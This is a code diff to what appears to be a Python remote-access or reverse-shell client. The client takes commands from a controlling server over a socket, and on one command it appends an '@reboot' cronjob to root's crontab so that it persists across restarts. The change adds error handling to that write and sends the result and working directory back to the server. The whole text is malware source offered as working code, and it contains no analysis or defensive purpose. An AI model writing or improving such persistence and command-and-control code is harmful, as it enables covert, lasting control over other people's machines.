@@ -49,12 +49,16 @@ while True:
                 # create a cronjob that starts with the machine
                 cronjob = f"@reboot {command[15:]}\n"
                 # write the cronjob to the crontab file
-                with open('/var/spool/cron/crontabs/root', 'a') as file:
-                    file.write(cronjob)
+                try:
+                    with open('/var/spool/cron/crontabs/root', 'a') as file:
+                        file.write(cronjob)
+                    # set the output to success message
+                    output = "Cronjob created successfully!"
+                except Exception as e:
+                    # if there's an error, set the output to the error message
+                    output = str(e)
                 # get the current working directory as output
                 cwd = os.getcwd()
-                # set the output to success message
-                output = "Cronjob created successfully!"
                 # send the results back to the server
                 message = f"{output}{SEPARATOR}{cwd}"
                 s.send(message.encode())
